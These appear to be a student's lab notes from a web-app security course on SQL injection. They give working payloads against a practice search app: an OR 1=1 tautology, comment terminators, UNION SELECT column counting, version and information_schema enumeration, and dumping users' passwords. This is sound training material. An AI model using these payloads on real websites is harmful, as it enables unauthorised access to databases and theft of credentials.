## SQL Injection - Introduction
- Arguable the most famous vulnerability of all time
- Modern web apps make it tricky to find and exploit
- Often a critical finding

## SQL Injection - UNION
-  1st Lab
-  Basic app that searches a database
-  Entering `Jeremy` returns `Username: jeremy - Email: jeremy@example.com`
-  Try single and double quotes to break SQL statements
-  Try logical operators
-  Entering `jeremy' or 1=1#` returns
  ```
  Username: jeremy - Email: jeremy@example.com
  
  Username: jessamy - Email: jessamy@example.com
  
  Username: bob - Email: bob@example.com
  ```

  - SQLi POC

- `#` is a terminator, ending the query, ignoring anything after, `-- -` also works.
- `1=1` is true statement, returns all

### UNION Select
- Can only select the same number of columns as in the original query
- Start with `'  union select null#` and then add nulls until you get a result
- `'  union select null,null,null# returned `Username: - Email: `
- This tells us there are 3 columns
- `'  union select null,null,version()#` returns `Username: - Email: 8.0.40` giving us the version of the database
- `'  union select null,null,table_name from information_schema.tables#` returns all of the tables
- Can also do columns, replacing table and tables
- Then do password from the app name and it returns the users' passwords
